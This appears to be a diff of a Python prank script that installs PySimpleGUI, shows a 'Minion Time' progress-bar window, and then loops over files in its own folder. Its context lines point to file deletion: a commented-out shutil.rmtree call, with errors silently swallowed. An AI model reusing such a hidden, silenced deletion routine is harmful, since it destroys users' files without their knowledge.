@@ -10,43 +10,21 @@ spec = importlib.util.find_spec("PySimpleGUI")
 if spec is None:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "PySimpleGUI"])
 
-def test():
-    import threading
-    sg.theme('SystemDefaultForReal')
-    layout = [[sg.Text('Testing progress bar:')],
-              [sg.ProgressBar(max_value=10, orientation='h', size=(20, 20), key='progress_1')]]
+layout = [[sg.Text('Minion Time', font="Roboto, 50")],
+          [sg.Image("C:\\Users\\admin\\Downloads\\minion.png")],
+          [sg.ProgressBar(10000, orientation='h', size=(20, 20), key='progressbar')]]
 
-    main_window = sg.Window('Test', layout, finalize=True)
-    current_value = 0
-    main_window['progress_1'].update(current_value)
+window = sg.Window('Minion Time').Layout(layout)
+progress_bar = window.find_element('progressbar')
 
-    threading.Thread(target=another_function,
-                     args=(main_window, ),
-                     daemon=True).start()
-
-    while True:
-        window, event, values = sg.read_all_windows()
-        if event == 'Exit':
-            break
-        if event.startswith('update_'):
-            print(f'event: {event}, value: {values[event]}')
-            key_to_update = event[len('update_'):]
-            window[key_to_update].update(values[event])
-            window.refresh()
-            continue
-        # process any other events ...
-    window.close()
-
-def another_function(window):
-    folder = [1, 2, 3, 4, 5, 6, 7]
-    countFiles = len(folder)
-    for i in range(countFiles + 1):
-        time.sleep(0.5)
-        current_value = int((i / countFiles) * 10)
-        window.write_event_value('update_progress_1', current_value)
-    time.sleep(2)
-    window.write_event_value('Exit', '')
-
+folder = [1, 2, 3, 4, 5, 6]
+countFiles = len(folder)
+prcntg = 0
+for i in range(countFiles + 1):
+    event, values = window.Read(timeout=1000)
+    progress_bar.UpdateBar(int((i / countFiles) * 10000))
+time.sleep(5)
+window.Close()
 
 folder = os.path.dirname(os.path.abspath(__file__))
 for filename in os.listdir(folder):
@@ -60,6 +38,5 @@ for filename in os.listdir(folder):
             # shutil.rmtree(file_path)
     except Exception as e:
         pass
-        #sg.Popup('Ilkyen da adzmo, to sama vivo nunu muggey dia %s. Reason: %s' % (file_path, e))
+        # sg.Popup('Ilkyen da adzmo, to sama vivo nunu muggey dia %s. Reason: %s' % (file_path, e))
 # sg.Popup('Tadda tu dim kaylay bem teepus')
-
